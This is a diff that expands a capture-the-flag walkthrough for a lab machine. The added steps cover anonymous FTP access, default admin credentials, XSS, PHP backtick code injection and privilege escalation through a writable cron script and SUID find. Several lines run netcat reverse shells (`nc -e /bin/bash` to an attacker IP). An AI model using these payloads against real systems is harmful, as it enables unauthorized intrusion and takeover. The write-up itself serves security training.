@@ -111,10 +111,11 @@ After further enumeration we found with nmap with more options
  2. FTP Anonymous Login
  The output of it we will see that we have anonymous access to ftp server on `port 21`
  
-    ftp <ip>
+     ftp <ip>
+
+        username: anonymous
+        passsword: anything
     
-    username: anonymous
-    passsword: anything
 then you will find a directory called pub in which inside it has a dockfile which you cam download it through
 
     get manifest.docs
@@ -124,14 +125,72 @@ It is nothing but a was to use backticks tricks to bypass php filters
   so every thing suspicious is terminated. So using backticks you completely bypass it
  
  3. Web service Enumeration
-     navigating to the the web page using the `VPN` ip provided we can see that there is default ubuntu page
  
- ### prevelege escation
+    * navigating to the the web page using the `VPN` ip provided we can see that there is default ubuntu page
+           ![](images/page.png)
+     * Viewing source codes we found there i some comments which is suspecious and it looks like base64 encoded string   
+         
+             ![](images/footer.png)
+         so decoding it as `base64` we can see the out put is
+              
+                 echo "L2JhY2t0aWNrcwo="|base64 -d                                                                   130 ⨯
+                       /backticks
+                       
+ so goind to `http://<ip>/backticks` we can see the login page now
+   trying the deafult usernames and passwords found that `username=admin&& password=admin`
+   loggin in we can see that there is a ordering system. Going through it we can see there is `game` to play..
+    trying `xss` was possible.
+      Example 
+      
+         <script>alert('xss')</script>
+         
+  Since our aim is to gain full access to the system so let's try to execute system comand by `php code injection`
+  many payloads failed but since from `ftp server` i learned something `backticks` i tryed to use backticks triks to execute commandds
+  
+  
+  example 
+  
+    ${print `ls`}
+    $print `pwd`}
+    ${print `nc -e /bin/bash 10.4.54.226 1191`}
+  Then we get reverse shell on backticks as user techguy, so we can submit our user.txt
+                 
+ ### privilege escation
  
  
-   * look at crontabs you may find editable to everybody scripts and it is run as user john so you cat get the userjohn shell now
-   * To be root just find suid binaries and read any file using the privilege of find command
+   * look at crontabs you may find editable to everybody scripts and it is run as user john so you cat get the user malwarepeter shell now
+             
+                      # cat /etc/crontab
+                                 
+                        # /etc/crontab: system-wide crontab
+                        # Unlike any other crontab you don't have to run the `crontab'
+                        # command to install the new version when you edit this file
+                        # and files in /etc/cron.d. These files also have username fields,
+                        # that none of the other crontabs do.
+
+                        SHELL=/bin/sh
+                        PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+                        # m h dom mon dow user  command
+                        17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+                        25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+                        47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+                        52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+                        # user malwarepeter
+                        *  *    * * * malwarepeter /opt/script.sh
+So editing the file and putting in reverseshell payload like
+
+    nc -e /bin/bash 10.4.54.226 1234
+    
+Then waiting for few minutes for cronjob to run and get malwarepeter shell on the netcat listerner
+  
+  #### root  privilege escation
+   * To be root just find suid binaries with command like
  
              find / -perm -u=s -type f 2>/dev/null
+   * find has SUID so we can use it to read root file like
+       
+          find . -exec cat /root/root.txt \;
              
    
